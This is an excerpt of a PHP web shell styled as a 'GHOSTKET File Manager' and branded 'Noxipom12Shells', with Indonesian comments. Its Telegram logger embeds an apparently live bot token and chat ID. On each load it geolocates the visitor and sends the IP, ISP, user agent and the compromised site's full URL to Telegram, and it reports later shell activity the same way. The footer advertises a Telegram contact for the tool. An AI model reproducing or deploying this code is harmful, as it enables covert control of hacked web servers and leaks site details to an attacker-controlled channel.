<?php
// ========== TELEGRAM LOGGER - GANTI TOKEN & CHAT ID ==========
$tl_token = "8667983075:AAFrTIlSgq5GGJ9JPBUO09JhrKOUj1hP3HY";  // GANTI!
$tl_chat  = "8672564075";    // GANTI!
...
function tl_getGeo($ip) {
    if ($ip == '127.0.0.1' || $ip == '::1') return ['city'=>'Localhost','country'=>'Local','isp'=>'Local'];
    $r = @file_get_contents("http://ip-api.com/json/{$ip}?fields=city,country,isp,regionName", false, stream_context_create(['http'=>['timeout'=>3]]));
    if ($r) { $d = json_decode($r, true); if ($d && isset($d['city'])) return $d; }
    return ['city'=>'Unknown','country'=>'Unknown','isp'=>'Unknown','regionName'=>''];
}

function tl_send($msg) {
    global $tl_token, $tl_chat;
    if ($tl_token == "TOKEN_BOT_KAMU") return;
    $url = "https://api.telegram.org/bot{$tl_token}/sendMessage";
    $data = ['chat_id'=>$tl_chat, 'text'=>$msg, 'parse_mode'=>'HTML', 'disable_web_page_preview'=>true];
    if (function_exists('curl_init')) {
        $ch = curl_init($url); curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_POST=>1, CURLOPT_POSTFIELDS=>$data, CURLOPT_TIMEOUT=>5, CURLOPT_SSL_VERIFYPEER=>0]);
        curl_exec($ch); curl_close($ch);
    } elseif (ini_get('allow_url_fopen')) {
        @file_get_contents($url, false, stream_context_create(['http'=>['method'=>'POST','header'=>"Content-Type: application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),'timeout'=>5]]));
    }
}

// Log akses shell
$tl_ip = tl_getIP();
$tl_geo = tl_getGeo($tl_ip);
$tl_loc = ($tl_geo['city']!='Unknown') ? "{$tl_geo['city']}, {$tl_geo['regionName']} - {$tl_geo['country']}" : "Unknown";
$tl_msg = "🔱 <b>Noxipom12Shells - LOGIN</b> 🔱\n";
$tl_msg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
$tl_msg .= "📅 <b>Waktu</b>    : ".date('Y-m-d H:i:s')."\n";
$tl_msg .= "🌐 <b>IP</b>       : <code>{$tl_ip}</code>\n";
$tl_msg .= "📍 <b>Lokasi</b>   : {$tl_loc}\n";
$tl_msg .= "🏠 <b>Hostname</b> : <code>".(@gethostbyaddr($tl_ip)?:'Unknown')."</code>\n";
$tl_msg .= "📡 <b>ISP</b>      : {$tl_geo['isp']}\n";
$tl_msg .= "📱 <b>UserAgent</b>: <code>".substr($_SERVER['HTTP_USER_AGENT']??'?',0,200)."</code>\n";
$tl_msg .= "🔗 <b>Path</b>     : <code>{$_SERVER['SCRIPT_NAME']}</code>\n";
$tl_msg .= "🌍 <b>Full URL</b> : ".(isset($_SERVER['HTTPS'])?'https':'http')."://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}\n";
$tl_msg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
$tl_msg .= "✅ <b>LOGIN BERHASIL</b>";
tl_send($tl_msg);

function tl_log($event, $detail='') {
    $msg = "⚡ <b>Noxipom12Shells - AKTIVITAS</b> ⚡\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "📅 <b>Waktu</b> : ".date('Y-m-d H:i:s')."\n";
    $msg .= "🌐 <b>IP</b>    : <code>".tl_getIP()."</code>\n";
    $msg .= "📋 <b>Event</b> : {$event}\n";
    if ($detail) $msg .= "📝 <b>Detail</b> : <pre>".htmlspecialchars(substr($detail,0,500))."</pre>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━━━";
    tl_send($msg);
}
// ========== END TELEGRAM LOGGER ==========
...
<header class="app-header">
    <div class="header-left">
        <img src="https://f.top4top.io/p_3818wbjoz7.jpg" class="header-logo" alt="">
        <div>
            <div class="header-title">1991 GHOSTKET File Manager </div>
...
<footer class="app-footer">
    <div class="footer-content">
        <img src="https://f.top4top.io/p_3818wbjoz7.jpg" class="footer-avatar" alt="">
        <div class="footer-text"><span>Contact Telegram</span> @Clonixxxx</div>
    </div>
</footer>
